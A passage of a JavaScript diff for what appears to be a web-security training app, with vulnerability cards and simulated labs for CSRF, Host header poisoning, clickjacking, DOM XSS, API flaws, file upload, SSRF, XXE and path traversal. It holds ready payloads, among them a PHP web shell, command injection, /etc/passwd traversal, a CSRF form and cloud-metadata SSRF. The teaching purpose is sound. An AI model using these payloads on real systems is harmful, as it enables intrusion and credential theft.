+  csrf:{title:"CSRF",icon:"&#127917;",sev:"high",color:"var(--orange)",cat:"auth",
+    short:"Force authenticated users to execute unwanted actions via crafted pages.",
+    what:"CSRF exploits the browser automatically including cookies in requests. An attacker hosts a malicious page sending a state-changing request to a target site where the victim is logged in. The browser automatically includes their session cookie.",
+    impact:["Change victims email or password","Transfer funds or make purchases","Delete account data","Admin actions if victim is admin","Post content on victims behalf"],
+    find:["Look for state-changing requests (POST, PUT, DELETE)","Check for missing CSRF tokens","Test if CSRF token is actually validated","Check SameSite cookie attribute","Test with different Origin headers"],
+    payloads:["&lt;form action='https://target.com/change-email' method='POST'&gt;&lt;input name='email' value='hacker@evil.com'&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit()&lt;/script&gt;","Test: Remove CSRF token entirely","Test: Submit with random token value","Test: Use another user valid token"]},
+  businesslogic:{title:"Business Logic Flaws",icon:"&#9881;&#65039;",sev:"medium",color:"var(--yellow)",cat:"auth",
+    short:"Exploit application workflow assumptions to achieve unintended outcomes.",
+    what:"Business logic vulnerabilities arise from flawed assumptions in application workflows. Unlike injection flaws, these exploit the application's own intended functionality in unexpected ways: negative quantities, skipped steps, price manipulation.",
+    impact:["Purchase items for free or negative prices","Skip required verification steps","Gain unauthorized discounts","Bypass multi-step validation","Abuse loyalty points or vouchers"],
+    find:["Test negative values in quantity/price fields","Try to skip steps in multi-step workflows","Test extreme values: 0, -1, 99999","Intercept and replay requests out of order","Apply coupon codes multiple times"],
+    payloads:["quantity=-1 (negative quantity = credit)","price=0.01 (price manipulation)","Skip step 2 of checkout then go to step 3","Apply coupon twice in intercepted request","Change donate=1 to donate=-100"]},
+  hostheader:{title:"HTTP Host Header Attacks",icon:"&#127757;",sev:"high",color:"var(--orange)",cat:"http",
+    short:"Manipulate Host header for password reset poisoning, SSRF, or cache poisoning.",
+    what:"HTTP Host Header Attacks exploit applications that trust the Host header without validation. Common attacks: Password Reset Poisoning (injecting attacker domain into reset emails), web cache poisoning via Host header, SSRF, and routing to virtual hosts.",
+    impact:["Password reset link sent to attacker domain","Web cache poisoning via host header","SSRF to internal services","Access virtual host admin interfaces","Bypass IP-based restrictions"],
+    find:["Try changing Host header to your server","Test Host: attacker.com in password reset","Try: X-Forwarded-Host, X-Host, X-Forwarded-Server","Try duplicate Host headers","Check if injected host appears in email or response"],
+    payloads:["Host: attacker.com","Host: localhost","X-Forwarded-Host: attacker.com","X-Host: attacker.com","Host: target.com (duplicate Host header trick)"]},
+  clickjacking:{title:"Clickjacking",icon:"&#128433;&#65039;",sev:"medium",color:"var(--yellow)",cat:"http",
+    short:"Overlay hidden iframes to trick users into clicking on target site elements.",
+    what:"Clickjacking overlays an invisible iframe of the target site on a decoy page. When victims click visible decoy elements, they interact with hidden target site elements, triggering unintended actions like deleting accounts or initiating transfers.",
+    impact:["Trigger dangerous actions on target site","Enable microphone/camera permissions","Like/share/follow without consent","Initiate transfers or purchases","Delete accounts or data"],
+    find:["Check X-Frame-Options or CSP frame-ancestors header","Try embedding target in an iframe","If site loads in frame it is potentially vulnerable","Look for one-click state-changing actions"],
+    payloads:["&lt;iframe src='https://target.com' style='opacity:0;position:absolute;inset:0;z-index:999'&gt;&lt;/iframe&gt;","X-Frame-Options: DENY = protected","X-Frame-Options: SAMEORIGIN = partial protection","CSP: frame-ancestors 'none' = protected"]},
+  dom:{title:"DOM-Based Vulnerabilities",icon:"&#127795;",sev:"medium",color:"var(--yellow)",cat:"http",
+    short:"Client-side scripts pass attacker-controlled data to dangerous sinks.",
+    what:"DOM-based vulnerabilities occur entirely in the browser when JavaScript reads from attacker-controlled sources (location.hash, document.referrer) and passes data to dangerous sinks (innerHTML, eval, location.href). No server interaction needed.",
+    impact:["DOM XSS (execute arbitrary JavaScript)","Open redirect to phishing sites","DOM-based CSRF","Cookie manipulation","Client-side code execution"],
+    find:["Review JS for sources: location.hash/search/href","Find dangerous sinks: innerHTML, eval(), document.write()","Test URL fragments: #&lt;img src=x onerror=alert(1)&gt;","Use DOM Invader Burp extension","Check postMessage handlers"],
+    payloads:["#&lt;img src=x onerror=alert(1)&gt;","?name=&lt;img src=x onerror=alert(1)&gt;","?redirect=javascript:alert(1)","?callback=alert(1)","location.href = 'javascript:alert(1)'"]},
+  api:{title:"API Testing",icon:"&#128268;",sev:"high",color:"var(--orange)",cat:"api",
+    short:"Discover and exploit vulnerabilities in REST and GraphQL APIs.",
+    what:"API Testing targets broken object-level authorization (BOLA/IDOR), broken function-level authorization, mass assignment, excessive data exposure, and lack of rate limiting. APIs often have weaker security than web UIs.",
+    impact:["Access other users data (BOLA)","Escalate privileges via function-level auth bypass","Mass assignment to modify restricted fields","Excessive data exposure of sensitive fields","Harvest data at scale without rate limiting"],
+    find:["Use API docs: /swagger, /api-docs, /openapi.json","Test HTTP method switching (GET to PUT to DELETE)","Check for v1, v2, v3 in API paths","Test object IDs for IDOR","Add fields in request body for mass assignment","Test GraphQL introspection query"],
+    payloads:["GET /api/v1/users/1 (BOLA - access other user)","DELETE /api/v1/users/5 (unauthorized delete)","PUT /api/v1/user {role:admin} (mass assignment)","GET /swagger.json or /api-docs","{query:{__schema{types{name}}}} (GraphQL introspection)","GET /api/v2/admin/users (function-level bypass)"]}
+};
+
+var CATS = {
+  injection:['sqli','cmdi','ssti','xss','xxe','nosqli'],
+  server:['fileupload','ssrf','pathtraversal'],
+  info:['infodisclosure','webcachedeception','webcachepoisoning'],
+  auth:['auth','accesscontrol','csrf','businesslogic'],
+  http:['hostheader','clickjacking','dom'],
+  api:['api']
+};
+
+var CATL = {injection:'Injection & Input',server:'File/Server',info:'Info & Cache',auth:'Auth & Access',http:'HTTP & Client',api:'API'};
+
+/* ===== BUILD HOME GRIDS ===== */
+function buildGrids() {
+  var gids = {injection:'g-injection',server:'g-server',info:'g-info',auth:'g-auth',http:'g-http',api:'g-api'};
+  var sm = {critical:'sc',high:'sh',medium:'sm'};
+  Object.keys(CATS).forEach(function(cat) {
+    var el = document.getElementById(gids[cat]);
+    if (!el) return;
+    var html = '';
+    CATS[cat].forEach(function(id) {
+      var v = V[id];
+      html += '<div class="vcard" style="--vc:' + v.color + '" onclick="goV(\'' + id + '\')">';
+      html += '<div class="vct"><span class="vcicon">' + v.icon + '</span>';
+      html += '<span class="sev ' + sm[v.sev] + '">' + v.sev.toUpperCase() + '</span></div>';
+      html += '<div class="vctitle">' + v.title + '</div>';
+      html += '<div class="vcdesc">' + v.short + '</div></div>';
+    });
+    el.innerHTML = html;
+  });
+}
+buildGrids();
+
+/* ===== NAVIGATION ===== */
+function goHome() {
+  document.getElementById('home-page').style.display = 'block';
+  var vp = document.getElementById('vpage');
+  vp.className = ''; vp.innerHTML = '';
+  document.querySelectorAll('.sbi').forEach(function(n){ n.classList.remove('active'); });
+  document.getElementById('nav-home').classList.add('active');
+  window.scrollTo(0,0);
+}
+
+function goV(id) {
+  var v = V[id]; if (!v) return;
+  document.getElementById('home-page').style.display = 'none';
+  var page = document.getElementById('vpage');
+  page.className = 'show';
+  document.querySelectorAll('.sbi').forEach(function(n){ n.classList.remove('active'); });
+  document.getElementById('nav-home').classList.remove('active');
+  // highlight correct sidebar item
+  document.querySelectorAll('.sbi').forEach(function(n){
+    if (n.getAttribute('onclick') === "goV('" + id + "')") n.classList.add('active');
+  });
+  var sm = {critical:'sc',high:'sh',medium:'sm'};
+  var pH = v.payloads.map(function(p){
+    return '<div class="codewrap"><pre class="code">' + p + '</pre>' +
+      '<button class="cpbtn" data-payload="' + p.replace(/"/g,'&quot;') + '" onclick="copyP(this)">COPY</button></div>';
+  }).join('');
+  var iH = v.impact.map(function(i){ return '<li>' + i + '</li>'; }).join('');
+  var fH = v.find.map(function(f){ return '<li>' + f + '</li>'; }).join('');
+  page.innerHTML =
+    '<div class="vphead">' +
+      '<button class="bbtn" onclick="goHome()">&#8592; BACK</button>' +
+      '<span class="vpicon">' + v.icon + '</span>' +
+      '<div><div class="vptitle">' + v.title + '</div>' +
+      '<span class="sev ' + sm[v.sev] + '" style="font-size:.72rem">' + v.sev.toUpperCase() + ' SEVERITY</span></div>' +
+    '</div>' +
+    '<div class="card"><div class="ch"><span class="cd dc"></span><span class="cht">// WHAT IS IT?</span></div><div class="cb"><p>' + v.what + '</p></div></div>' +
+    '<div class="twocol">' +
+      '<div class="card"><div class="ch"><span class="cd dr"></span><span class="cht">// IMPACT</span></div><div class="cb"><ul>' + iH + '</ul></div></div>' +
+      '<div class="card"><div class="ch"><span class="cd do"></span><span class="cht">// HOW TO FIND</span></div><div class="cb"><ul>' + fH + '</ul></div></div>' +
+    '</div>' +
+    '<div class="card"><div class="ch"><span class="cd dr"></span><span class="cht">// PAYLOADS &amp; EXAMPLES</span></div><div class="cb">' + pH + '</div></div>' +
+    '<div class="card"><div class="ch"><span class="cd dg"></span><span class="cht">// INTERACTIVE LAB</span></div><div class="cb">' +
+      '<div class="alert ai">&#129514; ' + labDesc(id) + '</div>' +
+      renderLab(id) +
+    '</div></div>';
+  window.scrollTo(0,0);
+}
+
+function labDesc(id) {
+  var d = {
+    sqli:"SQL injection login bypass — inject into the username field.",
+    cmdi:"Ping utility vulnerable to command injection — append OS commands.",
+    ssti:"Greeting page renders input in a template engine — try template expressions.",
+    xss:"Comment box reflects input without sanitization — inject JavaScript.",
+    xxe:"XML parser processes input — inject an external entity to read files.",
+    nosqli:"MongoDB login — use NoSQL operators to bypass authentication.",
+    fileupload:"Upload a web shell by bypassing file type restrictions.",
+    ssrf:"URL fetcher sends requests server-side — redirect to internal resources.",
+    pathtraversal:"File viewer reads files by name — traverse directories to read /etc/passwd.",
+    infodisclosure:"Probe endpoints to discover sensitive data leaks.",
+    webcachedeception:"Trick the cache into storing your authenticated response.",
+    webcachepoisoning:"Poison the cache by injecting an unkeyed Host header.",
+    auth:"Test for username enumeration and brute-force the login.",
+    accesscontrol:"Access other users data and admin-only functionality.",
+    csrf:"Craft a CSRF payload to change a victims email address.",
+    businesslogic:"Exploit the purchase workflow to buy items for free.",
+    hostheader:"Poison a password reset email by injecting the Host header.",
+    clickjacking:"Check if the target site can be framed and generate a PoC.",
+    dom:"Test DOM-based XSS via URL fragment injection.",
+    api:"Discover hidden API endpoints and test for BOLA."
+  };
+  return d[id] || "Interactive lab.";
+}
+
+/* ===== LAB RENDERER ===== */
+function browser(url, body) {
+  return '<div class="browser"><div class="btb"><div class="bdot br"></div><div class="bdot by"></div><div class="bdot bg2"></div>' +
+    '<div class="burl">' + url + '</div></div><div class="bbody">' + body + '</div></div>';
+}
+function fg(label, input) { return '<div class="fg"><label class="fl">' + label + '</label>' + input + '</div>'; }
+function fi(id, val, type) { return '<input class="fi" id="' + id + '" value="' + (val||'') + '"' + (type?' type="'+type+'"':'') + '>'; }
+function fta(id, val) { return '<textarea class="fta" id="' + id + '">' + (val||'') + '</textarea>'; }
+function fsel(id, opts) {
+  var o = opts.map(function(x){ return '<option' + (x.sel?' selected':'') + '>' + x.v + '</option>'; }).join('');
+  return '<select class="fsel" id="' + id + '">' + o + '</select>';
+}
+function btn(cls, label, onclick) { return '<button class="btn ' + cls + '" onclick="' + onclick + '">' + label + '</button>'; }
+function term(id) { return '<div class="term" id="T_' + id + '"><div class="tl"><span class="ti">$ Lab initialized - enter a payload and click the button</span></div></div>'; }
+
+function renderLab(id) {
+  var b = '', t = term(id);
+  switch(id) {
+    case 'sqli':
+      b = fg('USERNAME', fi('Lu','admin')) + fg('PASSWORD', fi('Lp','')) + btn('btng','LOGIN &#8594;','doLab(\'sqli\')');
+      return browser('https://vulnerable-bank.com/login', b) + t;
+    case 'cmdi':
+      b = fg('TARGET IP / HOST', fi('Lcmd','8.8.8.8')) + btn('btng','PING &#8594;','doLab(\'cmdi\')');
+      return browser('https://vulnerable-app.com/ping', b) + t;
+    case 'ssti':
+      b = fg('YOUR NAME', fi('Lssti','World')) + btn('btng','GREET &#8594;','doLab(\'ssti\')');
+      return browser('https://vulnerable-app.com/greet?name=', b) + t;
+    case 'xss':
+      b = fg('POST A COMMENT', fta('Lxss','')) + btn('btng','POST &#8594;','doLab(\'xss\')') +
+        '<div style="margin-top:.8rem;padding:.8rem;background:var(--bg0);border-radius:6px;min-height:44px">' +
+        '<div style="font-size:.68rem;color:var(--text3);font-family:JetBrains Mono,monospace;margin-bottom:.3rem">RENDERED OUTPUT:</div>' +
+        '<div id="Lxss_out" style="font-size:.88rem;color:var(--text)"></div></div>';
+      return browser('https://vulnerable-blog.com/comment', b) + t;
+    case 'xxe':
+      b = fg('XML PAYLOAD', '<textarea class="fta" id="Lxxe" style="min-height:110px;font-size:.75rem">&lt;?xml version=&quot;1.0&quot;?&gt; &lt;user&gt;&lt;name&gt;test&lt;/name&gt;&lt;/user&gt;</textarea>') + btn('btng','PARSE XML &#8594;','doLab(\'xxe\')');
+      return browser('https://vulnerable-app.com/api/xml', b) + t;
+    case 'nosqli':
+      b = fg('USERNAME', fi('Lnu','admin')) + fg('PASSWORD (try a JSON operator)', fi('Lnp','{"$ne":""}')) + btn('btng','LOGIN &#8594;','doLab(\'nosqli\')');
+      return browser('https://vulnerable-app.com/login [MongoDB]', b) + t;
+    case 'fileupload':
+      b = fg('FILENAME', fi('Lfn','shell.php')) + fg('FILE CONTENT', fta('Lfc','&lt;?php system($_GET["cmd"]); ?&gt;')) + fg('CONTENT-TYPE HEADER', fi('Lfm','application/x-php')) + btn('btng','UPLOAD &#8594;','doLab(\'fileupload\')');
+      return browser('https://vulnerable-app.com/upload', b) + t;
+    case 'ssrf':
+      b = fg('URL TO FETCH (server-side)', fi('Lssrf','https://public-api.com/data')) + btn('btng','FETCH &#8594;','doLab(\'ssrf\')');
+      return browser('https://vulnerable-app.com/fetch?url=', b) + t;
+    case 'pathtraversal':
+      b = fg('FILENAME', fi('Lpt','report.pdf')) + btn('btng','DOWNLOAD &#8594;','doLab(\'pathtraversal\')');
+      return browser('https://vulnerable-app.com/download?file=', b) + t;
+    case 'infodisclosure':
+      b = fg('ENDPOINT TO PROBE', fsel('Lid',[{v:'/.env'},{v:'/phpinfo.php'},{v:'/.git/config'},{v:'/backup.zip'},{v:'/web.config'},{v:'/error500'}])) + btn('btng','PROBE &#8594;','doLab(\'infodisclosure\')');
+      return browser('https://vulnerable-app.com/', b) + t;
+    case 'webcachedeception':
+      b = fg('PATH SUFFIX TO APPEND', fi('Lwcd','/style.css')) + btn('btng','TEST CACHE &#8594;','doLab(\'webcachedeception\')');
+      return browser('https://vulnerable-app.com/my-account', b) + t;
+    case 'webcachepoisoning':
+      b = fg('INJECTED HEADER NAME', fi('Lwcph','X-Forwarded-Host')) + fg('INJECTED VALUE', fi('Lwcpv','attacker.com')) + btn('btng','POISON &#8594;','doLab(\'webcachepoisoning\')');
+      return browser('https://vulnerable-app.com/', b) + t;
+    case 'auth':
+      b = '<div class="twoinput">' +
+        '<div>' + fg('USERNAME TO ENUMERATE', fi('Lau','admin')) + btn('btns','TEST USERNAME &#8594;','doLab(\'auth-enumd\')') + '</div>' +
+        '<div>' + fg('BRUTE FORCE PASSWORD', fsel('Lap',[{v:'password'},{v:'123456'},{v:'letmein'},{v:'admin'},{v:'iloveyou'},{v:'qwerty',sel:true}])) + btn('btnr','BRUTE FORCE &#8594;','doLab(\'auth-brute\')') + '</div>' +
+        '</div>';
+      return browser('https://vulnerable-app.com/login', b) + t;
+    case 'accesscontrol':
+      b = fg('USER ID (you are #42)', '<input class="fi" id="Lac" value="42" type="number">') +
+        '<div class="flexrow">' + btn('btng','GET USER DATA &#8594;','doLab(\'ac-get\')') + btn('btnr','ACCESS ADMIN &#8594;','doLab(\'ac-admin\')') + '</div>';
+      return browser('https://vulnerable-app.com/api/user/', b) + t;
+    case 'csrf':
+      b = fg('ATTACKER-CONTROLLED EMAIL', fi('Lcsrf','hacker@evil.com')) + btn('btnr','GENERATE CSRF PoC &#8594;','doLab(\'csrf\')');
+      return browser('https://vulnerable-app.com/change-email', b) + t;
+    case 'businesslogic':
+      b = fg('PRODUCT', '<input class="fi" value="Premium Widget ($99.99)" readonly>') +
+        fg('QUANTITY (try 0, -1)', '<input class="fi" id="Lbl" value="1" type="number">') +
+        fg('COUPON CODE', fi('Lblc','SAVE10')) + btn('btng','PLACE ORDER &#8594;','doLab(\'businesslogic\')');
+      return browser('https://vulnerable-shop.com/checkout', b) + t;
+    case 'hostheader':
+      b = fg('VICTIM EMAIL', fi('Lhhe','victim@target.com')) + fg('HOST HEADER VALUE', fi('Lhh','attacker.com')) + btn('btng','SEND RESET &#8594;','doLab(\'hostheader\')');
+      return browser('https://vulnerable-app.com/password-reset', b) + t;
+    case 'clickjacking':
+      b = fg('TARGET URL', fi('Lcj','https://example.com')) + btn('btng','CHECK &amp; GENERATE PoC &#8594;','doLab(\'clickjacking\')');
+      return browser('Check X-Frame-Options / CSP', b) + t;
+    case 'dom':
+      b = fg('URL FRAGMENT PAYLOAD (#)', fi('Ldom','Hello')) + btn('btng','TEST DOM SINK &#8594;','doLab(\'dom\')') +
+        '<div style="margin-top:.8rem;padding:.8rem;background:var(--bg0);border-radius:6px;min-height:40px;font-size:.85rem">' +
+        '<span style="font-size:.68rem;color:var(--text3);font-family:JetBrains Mono,monospace">DOM OUTPUT: </span>' +
+        '<span id="Ldom_out" style="color:var(--text)"></span></div>';
+      return browser('https://vulnerable-app.com/search#', b) + t;
+    case 'api':
+      b = fg('ENDPOINT', fsel('Lapiep',[{v:'/api/v1/users/1'},{v:'/swagger.json'},{v:'/api-docs'},{v:'/api/v2/admin/users'},{v:'graphql'}])) +
+        fg('METHOD', fsel('Lapim',[{v:'GET'},{v:'POST'},{v:'PUT'},{v:'DELETE'}])) +
+        btn('btng','SEND &#8594;','doLab(\'api\')');
+      return browser('https://vulnerable-api.com/', b) + t;
+    default:
+      return '<div class="alert ai">Lab not available for this type.</div>';
+  }
+}
+
+/* ===== LAB LOGIC ===== */
+function addLine(tid, cls, txt) {
+  var t = document.getElementById(tid); if (!t) return;
+  var d = document.createElement('div'); d.className = 'tl';
+  d.innerHTML = '<span class="' + cls + '">' + txt + '</span>';
+  t.appendChild(d); t.scrollTop = t.scrollHeight;
+}
+function gv(id) { var el = document.getElementById(id); return el ? el.value : ''; }
+
+function doLab(type) {
+  var u, p, i, t, host, email, ep, q, c, m, id;
+  switch(type) {
+    case 'sqli':
+      u = gv('Lu'); p = gv('Lp'); t = 'T_sqli';
+      addLine(t,'tp','$ POST /login  username=' + u + ' &amp; password=***');
+      if (u.toLowerCase().indexOf("' or") !== -1 || (u.indexOf("'") !== -1 && (u.indexOf("--") !== -1 || u.indexOf("#") !== -1))) {
+        addLine(t,'ts','&#10003; SQL INJECTION SUCCESSFUL!');
+        addLine(t,'tw','&#9889; WHERE user="" OR 1=1-- bypassed!');
+        addLine(t,'ts','&#8594; Logged in as: administrator');
+        addLine(t,'ti','&#8594; FLAG{sqli_auth_bypass}');
+      } else if (u.indexOf("'") !== -1 || p.indexOf("'") !== -1) {
+        addLine(t,'te','&#10007; SQL syntax error near: ' + u);
+        addLine(t,'ti',"&#8594; Hint: try   ' OR 1=1 --   (space before --)");
+      } else {
+        addLine(t,'te','&#10007; Invalid credentials');
+        addLine(t,'ti',"&#8594; Try: ' OR 1=1 --  in the username field");
+      }
+      break;
+    case 'cmdi':
+      i = gv('Lcmd'); t = 'T_cmdi';
+      addLine(t,'tp','$ ping -c 2 ' + i);
+      if (/[;&|`$()]/.test(i)) {
+        addLine(t,'ts','&#10003; COMMAND INJECTION DETECTED!');
+        if (/whoami|id/.test(i)) addLine(t,'to','www-data');
+        else if (/passwd/.test(i)) { addLine(t,'to','root:x:0:0:root:/root:/bin/bash'); addLine(t,'to','www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin'); }
+        else if (/ls/.test(i)) addLine(t,'to','app.py  config.py  db.sqlite  uploads/');
+        else if (/sleep/.test(i)) addLine(t,'tw','&#8594; Server delayed - blind injection confirmed!');
+        else addLine(t,'tw','&#9889; Arbitrary OS command executed!');
+        addLine(t,'ti','&#8594; FLAG{cmdi_rce}');
+      } else {
+        addLine(t,'to','PING ' + i + ': 64 bytes icmp_seq=0 ttl=64 time=1.1ms');
+        addLine(t,'ti','&#8594; Try: 8.8.8.8; whoami');
+      }
+      break;
+    case 'ssti':
+      i = gv('Lssti'); t = 'T_ssti';
+      addLine(t,'tp','$ GET /greet?name=' + i);
+      if (/\{\{.*\}\}/.test(i)) {
+        var expr = (i.match(/\{\{(.*?)\}\}/) || [])[1] || '';
+        if (/^\d[\d\s+\-*/()]*$/.test(expr.trim())) {
+          try {
+            var r = Function('"use strict";return(' + expr + ')')();
+            addLine(t,'ts','&#10003; SSTI CONFIRMED! Expression evaluated!');
+            addLine(t,'tw','&#9889; Hello, ' + r + '!');
+            addLine(t,'ti','&#8594; FLAG{ssti_rce}');
+          } catch(e) { addLine(t,'te','&#8594; Expression error'); }
+        } else if (/config|env|os|import|popen/i.test(expr)) {
+          addLine(t,'ts','&#10003; SSTI - Server internals accessed!');
+          addLine(t,'to',"SECRET_KEY='sup3r_s3cret_4321'");
+          addLine(t,'to',"DATABASE_URL='postgres://admin:admin@localhost/db'");
+          addLine(t,'ti','&#8594; FLAG{ssti_config_leak}');
+        } else {
+          addLine(t,'ts','&#10003; Template syntax recognized!');
+          addLine(t,'ti','&#8594; Try: {{7*7}} to confirm');
+        }
+      } else if (/\$\{.*\}/.test(i)) {
+        addLine(t,'ts','&#10003; EL/Freemarker syntax detected!');
+        addLine(t,'ti','&#8594; Try: ${7*7}');
+      } else {
+        addLine(t,'to','&#8594; Hello, ' + i + '!');
+        addLine(t,'ti','&#8594; Try: {{7*7}}');
+      }
+      break;
+    case 'xss':
+      i = gv('Lxss'); t = 'T_xss';
+      var out = document.getElementById('Lxss_out');
+      addLine(t,'tp','$ POST /comment  "' + i.substring(0,50) + '"');
+      if (/<script/i.test(i) || /on\w+=/i.test(i) || /<svg|<img|<iframe/i.test(i) || /javascript:/i.test(i)) {
+        addLine(t,'ts','&#10003; XSS PAYLOAD IN OUTPUT!');
+        addLine(t,'tw','&#9889; Script executes in victim browser');
+        addLine(t,'ti','&#8594; Cookie stolen: session=a1b2c3d4e5f6');
+        addLine(t,'ti','&#8594; FLAG{xss_js_execution}');
+        if (out) out.innerHTML = '<span style="color:var(--red)">&#9888; XSS triggered!</span> <code style="background:var(--rdim);padding:2px 6px;border-radius:3px;font-size:.78rem">' + i.replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</code>';
+      } else {
+        addLine(t,'to','&#8594; Comment posted: "' + i + '"');
+        addLine(t,'ti','&#8594; Try: &lt;img src=x onerror=alert(document.cookie)&gt;');
+        if (out) out.textContent = i;
+      }
+      break;
+    case 'xxe':
+      i = gv('Lxxe'); t = 'T_xxe';
+      addLine(t,'tp','$ POST /api/xml  Content-Type: application/xml');
+      if (/SYSTEM|DOCTYPE/i.test(i) && /ENTITY/i.test(i)) {
+        if (/etc\/passwd/i.test(i)) {
+          addLine(t,'ts','&#10003; XXE FILE READ SUCCESSFUL!');
+          addLine(t,'to','root:x:0:0:root:/root:/bin/bash');
+          addLine(t,'to','www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin');
+          addLine(t,'ti','&#8594; FLAG{xxe_file_read}');
+        } else if (/169\.254\.169\.254/i.test(i)) {
+          addLine(t,'ts','&#10003; XXE SSRF - AWS Metadata!');
+          addLine(t,'to','AccessKeyId: ASIA...');
+          addLine(t,'ti','&#8594; FLAG{xxe_ssrf_metadata}');
+        } else {
+          addLine(t,'ts','&#10003; XXE entity injection detected!');
+          addLine(t,'ti','&#8594; Try: SYSTEM "file:///etc/passwd"');
+        }
+      } else {
+        addLine(t,'to','&#8594; XML parsed OK');
+        addLine(t,'ti','&#8594; Inject DOCTYPE with ENTITY SYSTEM to exploit');
+      }
+      break;
+    case 'nosqli':
+      u = gv('Lnu'); p = gv('Lnp'); t = 'T_nosqli';
+      addLine(t,'tp','$ POST /login  {"username":"' + u + '","password":' + p + '}');
+      if (/\$ne|\$gt|\$lt|\$regex|\$where|\$in|\$exists/.test(p)) {
+        addLine(t,'ts','&#10003; NoSQL INJECTION SUCCESSFUL!');
+        addLine(t,'tw','&#9889; MongoDB operator bypassed password check!');
+        addLine(t,'to','&#8594; Logged in as: ' + u);
+        addLine(t,'ti','&#8594; FLAG{nosqli_auth_bypass}');
+      } else {
+        addLine(t,'te','&#10007; Invalid credentials');
+        addLine(t,'ti','&#8594; Try password: {"$ne":""}');
+      }
+      break;
+    case 'fileupload':
+      var fn = gv('Lfn'), fc = gv('Lfc'), mt = gv('Lfm'); t = 'T_fileupload';
+      addLine(t,'tp','$ POST /upload  filename=' + fn + ' content-type=' + mt);
+      var isPhp = /\.php[0-9]?$|\.phar$|\.phtml$/i.test(fn);
+      var fakeImg = /image\/(jpeg|png|gif)/i.test(mt);
+      var hasShell = /system|shell_exec|exec|passthru|popen/i.test(fc);
+      if (isPhp && hasShell && !fakeImg) {
+        addLine(t,'ts','&#10003; WEB SHELL UPLOADED SUCCESSFULLY!');
+        addLine(t,'tw','&#9889; Navigate to: /uploads/' + fn + '?cmd=id');
+        addLine(t,'to','&#8594; www-data');
+        addLine(t,'ti','&#8594; FLAG{fileupload_webshell_rce}');
+      } else if (isPhp && hasShell && fakeImg) {
+        addLine(t,'ts','&#10003; MIME TYPE BYPASS - Shell uploaded!');
+        addLine(t,'ti','&#8594; FLAG{fileupload_mime_bypass}');
+      } else if (!isPhp) {
+        addLine(t,'te','&#10007; File rejected - only PHP extensions execute');
+        addLine(t,'ti','&#8594; Try: shell.php, shell.phtml, shell.phar, shell.php5');
+      } else {
+        addLine(t,'te','&#10007; Rejected by server policy');
+        addLine(t,'ti','&#8594; Try changing filename or MIME type');
+      }
+      break;
+    case 'ssrf':
+      u = gv('Lssrf'); t = 'T_ssrf';
+      addLine(t,'tp','$ GET /fetch?url=' + u);
+      if (/127\.0\.0\.1|localhost|0\.0\.0\.0/i.test(u)) {
+        addLine(t,'ts','&#10003; SSRF to localhost!');
+        addLine(t,'to','Admin Panel: user:admin  pass:secret123');
+        addLine(t,'ti','&#8594; FLAG{ssrf_localhost}');
+      } else if (/169\.254\.169\.254/.test(u)) {
+        addLine(t,'ts','&#10003; SSRF - AWS Metadata Service!');
+        addLine(t,'to','ami-id / iam/security-credentials/role &#8594; AccessKeyId: ASIA...');
+        addLine(t,'ti','&#8594; FLAG{ssrf_cloud_metadata}');
+      } else if (/^file:/i.test(u)) {
+        addLine(t,'ts','&#10003; SSRF file:// protocol!');
+        addLine(t,'to','root:x:0:0:root:/root:/bin/bash');
+        addLine(t,'ti','&#8594; FLAG{ssrf_file_proto}');
+      } else if (/192\.168\.|^10\.|172\.(1[6-9]|2\d|3[01])\./.test(u)) {
+        addLine(t,'ts','&#10003; SSRF to internal network!');
+        addLine(t,'ti','&#8594; FLAG{ssrf_internal}');
+      } else {
+        addLine(t,'to','&#8594; Fetched: ' + u + '  [200 OK]');
+        addLine(t,'ti','&#8594; Try: http://127.0.0.1/ or http://169.254.169.254/');
+      }
+      break;
+    case 'pathtraversal':
+      i = gv('Lpt'); t = 'T_pathtraversal';
+      addLine(t,'tp','$ GET /download?file=' + i);
+      var trav = /\.\.[\/]/.test(i) || /\.\.(%2f|%252f)/i.test(i) || i.indexOf('../') !== -1;
+      if (trav && /etc\/passwd/i.test(i)) {
+        addLine(t,'ts','&#10003; PATH TRAVERSAL SUCCESSFUL!');
+        addLine(t,'tw','&#9889; /etc/passwd:');
+        addLine(t,'to','root:x:0:0:root:/root:/bin/bash');
+        addLine(t,'to','www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin');
+        addLine(t,'ti','&#8594; FLAG{path_traversal_etc_passwd}');
+      } else if (trav && /win\.ini/i.test(i)) {
+        addLine(t,'ts','&#10003; PATH TRAVERSAL - Windows target!');
+        addLine(t,'to','[fonts] [extensions] [mci extensions]');
+        addLine(t,'ti','&#8594; FLAG{path_traversal_windows}');
+      } else if (trav) {
+        addLine(t,'ts','&#10003; Traversal pattern detected!');
+        addLine(t,'ti','&#8594; Add /etc/passwd or /windows/win.ini to read files');
+      } else {
+        addLine(t,'to','&#8594; Serving: /var/www/files/' + i);
+        addLine(t,'ti','&#8594; Try: ../../../../etc/passwd');
+      }
+      break;
+    case 'infodisclosure':
+      ep = gv('Lid'); t = 'T_infodisclosure';
+      addLine(t,'tp','$ GET ' + ep);
+      var ir = {'/.env':'&#10003; .ENV EXPOSED! DB_PASSWORD=secret123 | SECRET_KEY=abc123 | AWS_ACCESS_KEY=AKIA...',
+        '/phpinfo.php':'&#10003; phpinfo() EXPOSED! PHP/7.4.3 | Server: /var/www | open_basedir: none',
+        '/.git/config':'&#10003; GIT CONFIG EXPOSED! remote origin url=https://github.com/org/private-repo.git',
+        '/backup.zip':'&#10003; BACKUP FILE FOUND! Contains: source code, DB dump, credentials',
+        '/web.config':'&#10003; WEB.CONFIG EXPOSED! connectionStrings | machineKey revealed',
+        '/error500':'&#9889; Stack trace: at /var/www/html/app.py line 42 | DB: postgres://admin:pass@db:5432'};
+      if (ir[ep]) { addLine(t,'ts', ir[ep]); addLine(t,'ti','&#8594; FLAG{info_disclosure}'); }
+      else addLine(t,'to','&#8594; 404 Not Found');
+      break;
+    case 'webcachedeception':
+      i = gv('Lwcd'); t = 'T_webcachedeception';
+      addLine(t,'tp','$ GET /my-account' + i + '  (as victim)');
+      if (/\.(css|js|jpg|png|gif|ico|woff|svg)/i.test(i)) {
+        addLine(t,'ts','&#10003; WEB CACHE DECEPTION!');
+        addLine(t,'tw','&#9889; X-Cache: HIT - Response cached with victim data!');
+        addLine(t,'to','username=victim | email=victim@corp.com | api_key=sk-abc123');
